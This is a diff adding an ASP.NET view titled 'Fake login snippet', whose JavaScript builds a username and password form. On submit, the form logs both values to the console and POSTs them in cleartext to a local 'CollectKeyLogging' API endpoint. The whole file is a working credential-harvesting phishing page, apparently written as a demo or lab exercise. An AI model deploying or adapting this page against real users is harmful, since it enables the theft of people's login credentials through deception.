@@ -1,0 +1,59 @@
+﻿
+@{
+    ViewBag.Title = "Index";
+}
+
+<!doctype html>
+<html>
+<head>
+    <title>Fake login snippet</title>
+</head>
+<body>
+    <script type="text/javascript">
+        //login form
+        var loginForm = document.createElement("form");
+        loginForm.setAttribute("method", "POST");
+        loginForm.setAttribute("action", "");
+        loginForm.setAttribute("id", "loginForm");
+
+        //username field
+        var usernameInput = document.createElement("input");
+        usernameInput.setAttribute("type", "text");
+        usernameInput.setAttribute("id", "usernameInput");
+
+        //password field
+        var passwordInput = document.createElement("input");
+        passwordInput.setAttribute("type", "password");
+        passwordInput.setAttribute("id", "passwordInput");
+
+        //login button
+        var loginButton = document.createElement("input");
+        loginButton.setAttribute("type", "submit");
+        loginButton.setAttribute("value", "Log in");
+        loginButton.setAttribute("id", "loginInput");
+
+        loginForm.appendChild(usernameInput);
+        loginForm.appendChild(document.createElement("br"));
+        loginForm.appendChild(passwordInput);
+        loginForm.appendChild(document.createElement("br"));
+        loginForm.appendChild(loginButton);
+
+        document.getElementsByTagName('body')[0].appendChild(loginForm);
+
+        //
+        loginForm.addEventListener("submit" , function (e) {
+
+            var username = document.getElementById("usernameInput").value
+            var password = document.getElementById("passwordInput").value
+
+            console.log("Username: " + username + " Password: " + password);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://localhost:49670/API/CollectKeyLogging');
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('username=' + username + '&password=' + password);
+        })
+    </script>
+</body>
+</html>
+
